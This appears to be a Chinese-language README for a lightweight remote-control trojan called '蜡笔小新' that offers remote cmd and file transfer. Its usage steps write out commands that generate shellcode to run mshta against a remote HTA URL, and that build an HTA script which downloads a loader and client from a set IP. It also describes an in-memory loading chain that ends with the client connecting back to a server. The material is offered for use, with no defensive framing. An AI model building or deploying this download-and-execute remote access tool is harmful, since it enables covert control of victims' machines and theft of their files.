<h1>蜡笔小新</h1>

<h3>版本</h3>
<p>1.0</p>

<h3>简介</h3>
<p>轻型远程控制软件</p>

<h3>功能</h3>
<p>1、远程 cmd</p>
<p>2、文件上传下载</p>

<h3>使用方法</h3>
<p>1、使用 shellcode\GetShellcode.py 生成 shellcode
   例子: GetShellcode.py -c "mshta http://192.168.0.1//u9V75048V41swXC4.msha" -o output.txt</p>

<p>2、使用 hta\DownloadURLFile.py 生成 hta 脚本。
   例子: DownloadURLFile.py -a 192.168.1.3 -b loader.exe -c client.exe </p>

<p>3、在 loader 项目中生成加载器
   例子: 这个需要用 vs 打开项目, 方便加载器加载客户端程序</p>

<p>4、在 trojan 项目中生成客户端和服务端程序
   例子: 这个也需要用 VS 打开项目, 之后在 Main 函数中修改需要连接的 IP 地址或者 URL, URL 连接的功能暂时没有做出来(-_-)</p>

<h3>加载流程</h3>
<p>通过内存 shellcode 远程加载 hta 脚本并运行, hta 脚本会将客户端和加载器下载到当前目录, 然后运行加载器并等待加载器完成工作, 最后运行客户端以连接服务端</p>
